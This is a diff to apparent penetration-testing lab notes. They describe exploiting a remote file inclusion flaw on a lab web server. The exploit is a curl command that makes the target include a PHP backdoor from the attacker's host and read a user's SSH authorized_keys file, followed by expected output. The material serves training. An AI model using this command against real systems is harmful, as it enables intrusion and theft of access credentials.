@@ -52,6 +52,12 @@ Exploiting RFI with a PHP backdoor and execution of ls
 
 Lab 1 - Follow the steps from this section to leverage the RFI on port 80 to remotely include the /usr/share/webshells/php/simple-backdoor.php PHP file. Use the "cmd" parameter to execute commands on VM #1 and use the cat command to view the contents of the authorized_keys file in the /home/elaine/.ssh/ directory. The file contains one entry including a restriction for allowed commands. Find the flag specified as the value to the command parameter in this file.
 >``` shell
+># Map Hostname to IP
+>kali@kali:~$ sudo nano /etc/hosts
+>
+># Add this line at the bottom:
+>192.168.196.16 mountaindesserts.com
+>
 >#Starting the Python3 http.server module
 >kali@kali:~$ cd /usr/share/webshells/php/
 >
@@ -60,7 +66,7 @@ Lab 1 - Follow the steps from this section to leverage the RFI on port 80 to rem
 ># Exploiting RFI with a PHP backdoor
 >kali@kali:/usr/share/webshells/php/$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.217/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"
 >
->># ========== Expected Result ==========
+># ========== Expected Result ==========
 >...
 ><a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
 ><!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
